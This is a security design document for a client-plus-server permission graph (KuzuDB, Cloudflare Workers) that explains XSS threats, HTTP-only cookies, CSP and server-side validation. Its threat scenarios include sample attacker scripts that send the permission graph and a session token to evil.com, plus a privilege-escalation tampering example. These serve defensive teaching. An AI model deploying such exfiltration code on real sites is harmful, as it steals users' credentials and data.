# Security Model & XSS Protection

## Core Security Principle

**Client-side authorization checks are for UX ONLY, never for security enforcement.**

```
┌─────────────────────────────────────────────────────────────┐
│  CLIENT (Browser)                                           │
│  ─────────────────────────────────────────────────────      │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ KuzuDB WASM - Permission Graph (Read-Only Copy)    │    │
│  │ • Fast UI decisions (show/hide buttons)            │    │
│  │ • Reduced server roundtrips                        │    │
│  │ • NOT A SECURITY BOUNDARY                          │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                             │
│  ❌ NEVER trust client: user.can("delete", "document")     │
│  ✅ Use for UX:        if (canDelete) showDeleteButton()   │
└─────────────────────────────────────────────────────────────┘
                           ↓
                    ALWAYS VALIDATE
                           ↓
┌─────────────────────────────────────────────────────────────┐
│  SERVER (Cloudflare Workers + Durable Objects)             │
│  ─────────────────────────────────────────────────────      │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ Durable Object: GraphStateCSV                       │    │
│  │ ───────────────────────────────────────────────     │    │
│  │ • SQLite mutation log (source of truth)            │    │
│  │ • CSV export → KV storage → KuzuDB                 │    │
│  │ • Server-side KuzuDB instance for validation       │    │
│  │ • Broadcasts to all connected clients              │    │
│  │                                                     │    │
│  │ SAME GRAPH DATA, TWO INSTANCES:                    │    │
│  │ - Server: Authoritative, for validation            │    │
│  │ - Client: Read-only copy, for UX optimization      │    │
│  │                                                     │    │
│  │ THIS IS THE SECURITY BOUNDARY ✓                    │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                             │
│  Flow: SQLite → CSV → Server KuzuDB → (WebSocket) → Client │
│        (mutations)  (export)  (validate)   (sync)   (UX)   │
└─────────────────────────────────────────────────────────────┘
```

## Graph Synchronization Architecture

**Key Insight**: We don't need a "duplicate" representation - we use the **same CSV data** in two places:

1. **Server KuzuDB** (Authoritative) - For permission validation
2. **Client KuzuDB** (Read-Only) - For UX optimization

Both load from the same CSV source, but serve different purposes.

## Threat Model

### What Client-Side Auth Protects

✅ **User Experience**:

- Instant permission checks (0ms, no network)
- Responsive UI (buttons, menus, features)
- Optimistic updates
- Offline-first functionality

✅ **Performance**:

- Reduced server load (fewer check requests)
- Lower latency (no roundtrip for common queries)
- Better scalability (computation distributed to clients)

### What Client-Side Auth Does NOT Protect

❌ **Data confidentiality from XSS**:

- If attacker injects script, they can read KuzuDB graph
- All client-side data is visible to JavaScript
- WebSocket messages can be intercepted
- Cannot prevent data exfiltration via compromised client

❌ **Security enforcement**:

- Client checks can be bypassed (disable JS, modify code)
- User can grant themselves any permission locally
- Cannot trust client-reported authorization results

## XSS Attack Scenarios

### Scenario 1: XSS Reads Permission Graph

```javascript
// Attacker injected script
const graph = window.__kuzuAuthClient.getPermissionGraph();
const allUsers = graph.query("MATCH (u:User) RETURN u.name");
fetch("https://evil.com/exfiltrate", {
  method: "POST",
  body: JSON.stringify(allUsers),
});
```

**Impact**: Attacker learns organization's permission structure

**Mitigation**:

1. **CSP headers** - Block unauthorized script execution
2. **Input sanitization** - Prevent XSS injection points
3. **Design assumption**: Permission graph is not secret data
4. **Sensitive data stays server-side** - Don't put PII in graph

**Key Insight**: Permission relationships are typically NOT sensitive. Knowing "Alice is in Engineering group" is not a security breach if the actual documents require server-side validation.

### Scenario 2: XSS Bypasses Client-Side Check

```javascript
// Attacker modifies client code
window.__kuzuAuthClient.can = () => true; // Always allow

// Now UI shows "Delete" button for everything
// But server will still reject unauthorized deletes
```

**Impact**: None - server validates every mutation

**Why This is Safe**:

- Server checks JWT/session on every request
- Durable Object validates permissions from authoritative state
- Client modification only affects attacker's own UI
- Cannot affect other users or actual permissions

### Scenario 3: XSS Steals Session Token

```javascript
// Attacker injected script
const token = localStorage.getItem("authToken");
fetch("https://evil.com/steal", {
  method: "POST",
  body: token,
});
```

**Impact**: HIGH - Attacker can impersonate user

**Mitigation**: Use HTTP-Only cookies (see next section)

### Scenario 4: User Modifies CSV Data Before Loading

```javascript
// Even with authenticated CSV download protected by HTTP-only cookies...

// Legitimate user downloads their org's CSV
fetch("/org/acme/csv") // Authenticated via HTTP-only cookie
  .then((r) => r.text())
  .then((csv) => {
    // User intercepts in DevTools and modifies
    const modified = csv + "\nAlice,admin_role,granted\n";

    // Loads tampered data into client KuzuDB
    authClient.loadCSV(modified);

    // Now client thinks Alice is admin
    authClient.can("delete", "critical_resource"); // Returns true!
  });
```

**Impact**: HIGH if server trusts client - but NONE with server validation

**Why HTTP-Only Cookies Don't Prevent This**:

- HTTP-only cookies protect the SESSION TOKEN from XSS
- They do NOT protect the CSV data once it's in browser memory
- They do NOT prevent the legitimate user from tampering with data
- Any JavaScript (including user's own DevTools) can modify the CSV
- Client-side graph is ALWAYS untrusted, regardless of how it was loaded

**The Fundamental Problem**:

```
❌ BROKEN SECURITY MODEL:
   "If we authenticate the CSV download, we can trust the client graph"

   Problem: User controls their browser completely
   - Can modify CSV before loading
   - Can patch KuzuDB queries
   - Can forge query results
   - Can lie about what permissions they have

✅ CORRECT SECURITY MODEL:
   "Client graph is for UX only, server always validates"

   Solution: Authenticate CSV download (data isolation between orgs)
            + Server validates every mutation (security enforcement)
```

**Example Attack Without Server Validation**:

```
1. Alice authenticates, downloads CSV for org_acme (legitimate)
2. Alice opens DevTools, modifies CSV to add: "Alice,admin,granted"
3. Alice loads modified CSV into client KuzuDB
4. Client thinks Alice is admin (graph says so)
5. Alice tries to delete critical document
6. ❌ If server trusts client: Document deleted!
7. ✅ If server validates: 403 Forbidden (Alice not admin)
```

**What HTTP-Only Cookies Actually Protect**:

- ✅ Session token from XSS exfiltration
- ✅ Prevent unauthorized org access (can't download other org's CSV)
- ✅ WebSocket authentication (can't connect to other org's DO)
- ❌ NOT client-side data tampering
- ❌ NOT client-side code modification
- ❌ NOT query result forgery

## HTTP-Only Cookie Strategy

### What HTTP-Only Cookies Protect

✅ **Session tokens cannot be read by JavaScript**:

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

✅ **XSS cannot exfiltrate authentication credentials**

✅ **Browser automatically sends with requests**

✅ **Data isolation between orgs** (can only download your org's CSV)

✅ **WebSocket authentication** (can only connect to your org's DO)

### What HTTP-Only Cookies Cannot Protect

❌ **In-memory data structures** (KuzuDB graph, WebSocket messages)
❌ **Function calls** (attacker can still call `client.can()`)
❌ **UI state** (attacker can read/modify DOM)
❌ **Client-side data tampering** (user can modify CSV before loading)
❌ **Query result forgery** (user can lie about what graph says)
❌ **CSRF without additional protection** (need CSRF tokens)

### The Critical Misconception

**❌ WRONG**: "If we authenticate the CSV download with HTTP-only cookies, we can trust the client graph and skip server validation"

**Why This Fails**:

1. **User controls their browser**: Even legitimate users can open DevTools and modify data
2. **HTTP-only protects token, not data**: Once CSV is in memory, JavaScript can modify it
3. **Client is always untrusted**: Even if data arrives securely, it can be tampered with before/after loading
4. **No cryptographic guarantee**: Can't prove client didn't modify the graph

**✅ CORRECT**: "HTTP-only cookies authenticate the user and isolate org data, but server must still validate all mutations"

**What We Actually Achieve**:

```
HTTP-Only Cookies → Authenticate CSV download
                    (Prevent org_acme from downloading org_xyz's data)

Client-Side Graph → Fast UX checks (0ms, no network)
                    (Show/hide buttons based on permissions)

Server-Side Graph → Security enforcement
                    (Validate every mutation against authoritative state)
```

### Implementation Architecture

```
┌──────────────────────────────────────────────────────────┐
│  Client Application                                      │
│                                                          │
│  ┌────────────────────────────────────────────────┐     │
│  │  localStorage / sessionStorage                 │     │
│  │  ❌ NO TOKENS HERE                            │     │
│  │  ✅ Only non-sensitive UI state               │     │
│  └────────────────────────────────────────────────┘     │
│                                                          │
│  ┌────────────────────────────────────────────────┐     │
│  │  HTTP-Only Cookie (browser-managed)           │     │
│  │  ✅ session=<JWT>                             │     │
│  │  ✅ HttpOnly, Secure, SameSite=Strict         │     │
│  │  ✅ XSS cannot read this                      │     │
│  └────────────────────────────────────────────────┘     │
│                                                          │
│  ┌────────────────────────────────────────────────┐     │
│  │  Client KuzuDB (in-memory graph)              │     │
│  │  ⚠️  Loaded from authenticated CSV download   │     │
│  │  ❌ BUT user can modify before/after load     │     │
│  │  ❌ Cannot trust for security decisions       │     │
│  │  ✅ OK for UX optimization                    │     │
│  └────────────────────────────────────────────────┘     │
│                                                          │
│  Requests automatically include cookie:                 │
│  GET /org/acme/csv (download graph - authenticated)     │
│  WebSocket: wss://api.example.com/org/acme/ws          │
│  Mutations: POST /org/acme/grant (validated)            │
└──────────────────────────────────────────────────────────┘
                         ↓
                Cookie sent automatically
                         ↓
┌──────────────────────────────────────────────────────────┐
│  Cloudflare Worker                                       │
│                                                          │
│  async fetch(request, env) {                            │
│    // Extract session from HTTP-Only cookie            │
│    const cookie = request.headers.get('Cookie');       │
│    const session = parseCookie(cookie, 'session');     │
│                                                          │
│    // Validate JWT                                      │
│    const user = await validateJWT(session, env.JWT_SECRET); │
│    if (!user) return unauthorized();                    │
│                                                          │
│    // Route to appropriate handler                     │
│    if (path === '/csv') {                               │
│      // Serve CSV for client graph (authenticated)     │
│      return serveCSV(user.orgId);                       │
│    }                                                     │
│                                                          │
│    // For mutations: validate against SERVER graph     │
│    if (isMutation) {                                    │
│      const allowed = await validateWithServerGraph(    │
│        user.id, mutation.permission, mutation.resource  │
│      );                                                  │
│      if (!allowed) return forbidden();                  │
│    }                                                     │
│                                                          │
│    return handleRequest(request, user);                 │
│  }                                                       │
└──────────────────────────────────────────────────────────┘
                         ↓
                Uses Server KuzuDB
                         ↓
┌──────────────────────────────────────────────────────────┐
│  Durable Object: GraphStateCSV                           │
│                                                          │
│  ┌────────────────────────────────────────────────┐     │
│  │  Server KuzuDB (authoritative graph)           │     │
│  │  ✅ Loaded from same CSV as client             │     │
│  │  ✅ CANNOT be tampered with by user            │     │
│  │  ✅ Used for security enforcement              │     │
│  │  ✅ Source of truth for all validations       │     │
│  └────────────────────────────────────────────────┘     │
└──────────────────────────────────────────────────────────┘
```

**Key Insight**: Same CSV data, but different trust levels:

- **Client graph**: User-controlled environment → Untrusted (UX only)
- **Server graph**: Worker-controlled environment → Trusted (security)

## Defense in Depth Strategy

### Layer 1: Prevent XSS Injection

**Content Security Policy (CSP)**:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'wasm-unsafe-eval' https://cdn.jsdelivr.net;
  connect-src 'self' wss://api.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

**Input Sanitization**:

```typescript
import DOMPurify from "dompurify";

// Sanitize all user input before rendering
function renderComment(text: string) {
  const clean = DOMPurify.sanitize(text, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
    ALLOWED_ATTR: ["href"],
  });
  return clean;
}
```

**Template Escaping** (React/Vue/etc automatically escape):

```tsx
// ✅ SAFE - React escapes by default
<div>{user.name}</div>

// ❌ DANGEROUS - Raw HTML
<div dangerouslySetInnerHTML={{__html: user.name}} />
```

### Layer 2: Secure Session Management

**HTTP-Only Cookie Setup**:

```typescript
// Cloudflare Worker sets session cookie
const response = new Response("Authenticated");
response.headers.set(
  "Set-Cookie",
  [
    "session=" + jwtToken,
    "HttpOnly",
    "Secure",
    "SameSite=Strict",
    "Max-Age=86400", // 24 hours
    "Path=/",
  ].join("; ")
);
```

**WebSocket Authentication**:

```typescript
// Worker validates session before upgrading to WebSocket
async function handleWebSocketUpgrade(request: Request): Promise<Response> {
  // Extract session from cookie
  const cookie = request.headers.get("Cookie");
  const session = parseCookie(cookie, "session");

  // Validate JWT
  const user = await validateJWT(session);
  if (!user) {
    return new Response("Unauthorized", { status: 401 });
  }

  // Upgrade to WebSocket only if authenticated
  const { 0: client, 1: server } = new WebSocketPair();

  // Store user context in DO
  const id = env.GRAPH_STATE_DO.idFromName(user.orgId);
  const stub = env.GRAPH_STATE_DO.get(id);
  await stub.acceptWebSocket(server, { userId: user.id, orgId: user.orgId });

  return new Response(null, { status: 101, webSocket: client });
}
```

### Layer 3: Server-Side Validation

**Validate Every Mutation**:

```typescript
// Durable Object
class GraphStateCSV {
  async handleMutation(userId: string, mutation: Mutation): Promise<void> {
    // ALWAYS validate user has permission to mutate
    const canMutate = await this.checkPermission(userId, "admin", this.orgId);
    if (!canMutate) {
      throw new Error("Unauthorized: User cannot modify permissions");
    }

    // Validate mutation makes sense
    if (mutation.type === "grant") {
      if (!this.isValidUser(mutation.user)) {
        throw new Error("Invalid user");
      }
      if (!this.isValidResource(mutation.resource)) {
        throw new Error("Invalid resource");
      }
    }

    // Apply mutation
    await this.applyMutation(mutation);

    // Audit log
    await this.auditLog.record({
      actor: userId,
      action: mutation.type,
      target: mutation.user,
      resource: mutation.resource,
      timestamp: Date.now(),
    });
  }
}
```

**Rate Limiting**:

```typescript
// Per-user rate limiting
const rateLimiter = new Map<string, { count: number; resetAt: number }>();

function checkRateLimit(userId: string): boolean {
  const now = Date.now();
  const limit = rateLimiter.get(userId);

  if (!limit || now > limit.resetAt) {
    rateLimiter.set(userId, { count: 1, resetAt: now + 60000 }); // 1 min window
    return true;
  }

  if (limit.count >= 100) {
    // 100 requests per minute
    return false;
  }

  limit.count++;
  return true;
}
```

### Layer 4: Audit Logging

**Track All Sensitive Operations**:

```typescript
interface AuditLog {
  timestamp: string;
  actor: string; // User who performed action
  action: string; // grant, revoke, check
  target: string; // User/group affected
  resource: string; // Resource accessed
  result: "success" | "denied";
  ip: string;
  userAgent: string;
}

// Log to Durable Object SQLite + periodic backup to R2
await this.state.storage.sql.exec(
  `INSERT INTO audit_log (timestamp, actor, action, target, resource, result, ip) 
   VALUES (?, ?, ?, ?, ?, ?, ?)`,
  Date.now(),
  userId,
  action,
  target,
  resource,
  result,
  clientIP
);
```

**Anomaly Detection**:

```typescript
// Flag suspicious patterns
async function detectAnomalies(userId: string): Promise<Alert[]> {
  const alerts: Alert[] = [];

  // Check for rapid permission checks (possible enumeration)
  const recentChecks = await getRecentChecks(userId, 60000); // Last minute
  if (recentChecks.length > 1000) {
    alerts.push({
      severity: "high",
      type: "enumeration_attempt",
      details: `${recentChecks.length} checks in 1 minute`,
    });
  }

  // Check for unusual mutation patterns
  const recentMutations = await getRecentMutations(userId, 3600000); // Last hour
  if (recentMutations.filter((m) => m.type === "grant").length > 50) {
    alerts.push({
      severity: "medium",
      type: "excessive_grants",
      details: "Unusual number of permission grants",
    });
  }

  return alerts;
}
```

## Security Best Practices

### ✅ DO: Client-Side UX Optimization

```typescript
// Good: Fast UI decisions
async function renderDocument(doc: Document) {
  const canEdit = await authClient.can("edit", doc.id);
  const canDelete = await authClient.can("delete", doc.id);

  return (
    <Document>
      <Content>{doc.content}</Content>
      {canEdit && <EditButton />}
      {canDelete && <DeleteButton />}
    </Document>
  );
}
```

### ✅ DO: Always Validate Server-Side

```typescript
// Good: Server validates before executing
async function deleteDocument(docId: string, request: Request) {
  const user = await authenticateRequest(request);

  // SERVER checks permission, not client
  const canDelete = await checkPermission(user.id, "delete", docId);
  if (!canDelete) {
    return new Response("Forbidden", { status: 403 });
  }

  await db.documents.delete(docId);
  return new Response("Deleted");
}
```

### ❌ DON'T: Trust Client Permission Checks

```typescript
// Bad: Trusting client-reported permission
async function deleteDocument(docId: string, request: Request) {
  const { userId, canDelete } = await request.json();

  // ❌ NEVER trust client's canDelete value
  if (canDelete) {
    await db.documents.delete(docId); // VULNERABLE!
  }
}
```

### ❌ DON'T: Store Sensitive Data Client-Side

```typescript
// Bad: Sensitive data in client
const user = {
  id: "123",
  name: "Alice",
  ssn: "123-45-6789", // ❌ DON'T
  creditCard: "****", // ❌ DON'T
  salary: 150000, // ❌ DON'T
};

// Good: Only non-sensitive data
const user = {
  id: "123",
  name: "Alice",
  email: "alice@example.com",
  groups: ["engineering", "leads"],
};
```

## Comparison with Traditional Authorization

### Server-Side Only (Traditional)

```
Client: Can I edit document 123?
  ↓ (50ms network)
Server: Checks DB → Yes
  ↓ (50ms network)
Client: Shows edit button

Total: 100ms per check
```

**Security**: ✅ Perfect - all checks server-side
**Performance**: ❌ Slow - network roundtrip for every check
**Scalability**: ❌ Poor - server CPU for every check

### Client-Side with Server Validation (Our Model)

```
Client: Can I edit document 123? (0ms - local KuzuDB)
Client: Shows edit button immediately

User clicks: Edit document 123
  ↓ (50ms network)
Server: Validates user can edit → Yes (authoritative check)
  ↓ (50ms network)
Client: Document saved

UI: 0ms (instant)
Mutation: 100ms (validated)
```

**Security**: ✅ Perfect - mutations validated server-side
**Performance**: ✅ Excellent - instant UI, validated actions
**Scalability**: ✅ Excellent - client computes, server validates

## Implementation Checklist

### Phase 1: XSS Prevention

- [ ] Implement Content Security Policy (CSP)
- [ ] Sanitize all user input with DOMPurify
- [ ] Use framework auto-escaping (React/Vue/etc)
- [ ] Regular security audits with tools (OWASP ZAP, etc)
- [ ] Penetration testing

### Phase 2: Session Management

- [ ] Implement HTTP-Only cookies for session tokens
- [ ] Add Secure and SameSite=Strict flags
- [ ] Implement CSRF tokens for mutations
- [ ] Session expiration and refresh logic
- [ ] Revocation mechanism (logout, compromise)

### Phase 3: Server-Side Validation

- [ ] Validate JWT on every request
- [ ] Check permissions in Durable Object before mutations
- [ ] Rate limiting per user/org
- [ ] Input validation (user IDs, resource IDs, etc)
- [ ] Idempotency keys for mutations

### Phase 4: Audit & Monitoring

- [ ] Audit log all permission checks
- [ ] Audit log all mutations
- [ ] Anomaly detection (enumeration, excessive grants)
- [ ] Real-time alerting for suspicious activity
- [ ] Regular log analysis and reporting

### Phase 5: Testing

- [ ] Automated XSS testing in CI/CD
- [ ] Manual penetration testing
- [ ] Fuzz testing (invalid inputs, edge cases)
- [ ] Load testing with malicious patterns
- [ ] Red team exercises

## Conclusion

**Client-side authorization is safe when:**

1. Used for UX optimization, not security
2. Combined with mandatory server-side validation
3. Session tokens protected via HTTP-Only cookies
4. XSS prevented with CSP + input sanitization
5. All mutations validated server-side
6. Comprehensive audit logging

**Remember**: The client is always compromised. Design as if an attacker has full control of the client, and your system will be secure.

## Why You Can't Skip Server-Side Validation

### The Question

> "Couldn't we use HTTP-only cookies to protect the CSV files that generate the graph, so we can then count on that graph being used by an authenticated user... instead of duplicating the graph?"

### The Answer: No

**HTTP-only cookies protect authentication tokens, not client-side data.**

```
┌─────────────────────────────────────────────────────────┐
│ What HTTP-Only Cookies DO:                              │
├─────────────────────────────────────────────────────────┤
│ ✅ Protect session token from XSS theft                │
│ ✅ Authenticate CSV download (org isolation)           │
│ ✅ Authenticate WebSocket connections                  │
│ ✅ Prevent unauthorized data access                    │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│ What HTTP-Only Cookies DON'T DO:                        │
├─────────────────────────────────────────────────────────┤
│ ❌ Prevent user from modifying CSV in DevTools         │
│ ❌ Prevent tampering with in-memory graph              │
│ ❌ Prove client hasn't modified the data               │
│ ❌ Make client-side checks trustworthy                 │
└─────────────────────────────────────────────────────────┘
```

### Attack Scenario

Even with perfectly implemented HTTP-only cookies:

```javascript
// Step 1: Legitimate authenticated user
fetch("/org/acme/csv", {
  credentials: "include", // HTTP-only cookie sent automatically
})
  .then((r) => r.text())
  .then((csv) => {
    // Step 2: User tampers with data in DevTools
    const tampered = csv.replace(
      "Alice,viewer",
      "Alice,admin" // Upgrade own permissions
    );

    // Step 3: Load tampered data
    authClient.loadCSV(tampered);

    // Step 4: Client now thinks Alice is admin
    console.log(authClient.can("delete", "critical_doc")); // true!

    // Step 5: Try to delete document
    fetch("/documents/critical_doc", { method: "DELETE" });
  });
```

**If server trusts client**: ❌ Document deleted! Security breach!

**If server validates**: ✅ Server checks its own graph → Alice is viewer → 403 Forbidden

### The Only Secure Architecture

```
┌──────────────────────────────────────────────────────────┐
│  Data Flow                                               │
└──────────────────────────────────────────────────────────┘

    Mutations (grant/revoke)
            ↓
    ┌─────────────────┐
    │ SQLite Log      │  ← Source of truth
    │ (DO Storage)    │
    └────────┬────────┘
             │
    Export to CSV (debounced)
             │
    ┌────────┴────────┐
    │                 │
    ↓                 ↓
Server KuzuDB    Client KuzuDB
(Authoritative)  (Read-only copy)
    │                 │
    │                 ↓
    │            Fast UX checks
    │            (show/hide buttons)
    │
    ↓
Validates ALL CRUD operations
(Security boundary)


┌──────────────────────────────────────────────────────────┐
│  Why We Need Both Instances                              │
└──────────────────────────────────────────────────────────┘

Client Instance (Browser):
  • Controlled by user (can be tampered with)
  • Used for: UI optimization, instant feedback
  • Trust level: ZERO for security decisions
  • Performance: 0ms queries (no network)

Server Instance (Durable Object):
  • Controlled by our code (cannot be tampered with)
  • Used for: Security enforcement, validation
  • Trust level: FULL (authoritative)
  • Performance: <1ms queries (in-memory)
```

### Alternative: Server-Only Architecture (Valid Choice!)

**Yes, you can keep KuzuDB only in the Durable Object!**

This eliminates all client-side tampering concerns. Here are the two valid options:

```
Option A: Server-Only (Maximum Security, Traditional)
  ✅ Zero tampering risk (client has no data)
  ✅ Single source of truth (simpler)
  ✅ No sync complexity
  ❌ Every permission check = network roundtrip (50-100ms)
  ❌ Higher server load (all queries hit DO)
  ❌ Slower UI (buttons/menus wait for server)

  User: "Can I see edit button?"
    → Fetch request (50ms network)
    → DO queries KuzuDB (1ms)
    → Response (50ms network)
    → Show/hide button
  Total: ~100ms per UI element

Option B: Client + Server (Performance Optimization)
  ✅ Instant UI (0ms permission checks)
  ✅ Reduced server load (client computes)
  ✅ Works offline (for UI only)
  ⚠️  Client can tamper (but doesn't matter - see below)
  ⚠️  Must sync client graph (WebSocket)
  ⚠️  Memory overhead (~10-50MB/org)

  User: "Can I see edit button?"
    → Client KuzuDB (0ms, local)
    → Show button instantly

  User: "Actually edit the document"
    → Fetch request (50ms network)
    → DO validates with server KuzuDB (1ms)
    → Execute or reject (50ms network)
  Total: 0ms for UI, 100ms for mutation (validated)
```

### Why Client Tampering Doesn't Matter (Option B)

**Key Insight**: With server validation, client tampering only affects the attacker's own UI:

```
Scenario: Alice tampers with client graph to make herself admin

1. Alice modifies client KuzuDB: "Alice is admin" ✓
2. Client shows admin buttons to Alice ✓
3. Alice clicks "Delete Critical Document"
4. Server checks: Is Alice admin? → NO
5. Server returns: 403 Forbidden
6. Result: Alice saw buttons but couldn't use them

Impact: Alice wasted her own time. No security breach.
```

The client graph is just a **cache for UI decisions**. Even if completely wrong, it can't bypass server validation.

### Which Option Should You Choose?

**Choose Option A (Server-Only) if:**

- Security simplicity is paramount
- You don't mind 50-100ms delays for permission checks
- UI loads infrequently (e.g., page load only)
- Small number of permission checks per page
- Lower development complexity is important

**Choose Option B (Client + Server) if:**

- UI responsiveness is critical (0ms vs 100ms matters)
- Many permission checks per page (dozens of buttons/menus)
- Frequent re-checks (e.g., real-time collaboration)
- You want to reduce server load
- Offline-first UX is desired

### Implementation: Server-Only Architecture

```typescript
// Client: Simple API wrapper (no KuzuDB)
class AuthClient {
  private baseUrl: string;

  async can(permission: string, resourceId: string): Promise<boolean> {
    // Every check hits server
    const response = await fetch(`${this.baseUrl}/check`, {
      method: "POST",
      credentials: "include", // HTTP-only cookie
      body: JSON.stringify({ permission, resourceId }),
    });

    return response.json().then((r) => r.allowed);
  }
}

// Server: KuzuDB in Durable Object only
class GraphStateCSV {
  private kuzu: Database;

  async handleCheckPermission(
    userId: string,
    permission: string,
    resourceId: string
  ): Promise<boolean> {
    // Query server KuzuDB
    const result = await this.kuzu.query(
      `
      MATCH (u:User {id: $userId})-[:HAS_PERMISSION]->(r:Resource {id: $resourceId})
      WHERE permission = $permission
      RETURN count(*) > 0 AS allowed
    `,
      { userId, permission, resourceId }
    );

    return result.rows[0].allowed;
  }
}
```

**Tradeoff Summary**:

- Option A: Simpler architecture, slower UI (100ms per check)
- Option B: More complex, instant UI (0ms per check, mutations still validated)

### Summary

**Two Valid Security Architectures:**

**Server-Only (Traditional)**:

- ✅ HTTP-only cookies: Protect session tokens
- ✅ Server-side KuzuDB only: All validation in DO
- ✅ Client has no graph data: Zero tampering risk
- ⚠️ Every check requires network: 50-100ms per UI decision
- **Use when**: Security simplicity > UI speed

**Client + Server (Performance Optimized)**:

- ✅ HTTP-only cookies: Protect session tokens
- ✅ Authenticated CSV downloads: Org data isolation
- ✅ Client-side graph: Fast UX (0ms checks)
- ✅ Server-side graph: Security validation (all mutations)
- ⚠️ Client can tamper: But only affects their own UI
- **Use when**: UI responsiveness critical

**The Key Principle**: With server validation, client tampering is harmless. It's like giving someone a fake key - they can try to use it, but the lock (server) still enforces real access control.

**What's NOT Valid**:

- ❌ Client-only (no server validation): User can grant themselves any permission
- ❌ Trusting client checks: Server must always validate mutations

Authentication determines **which data** users can access, not **whether we trust their copy**.
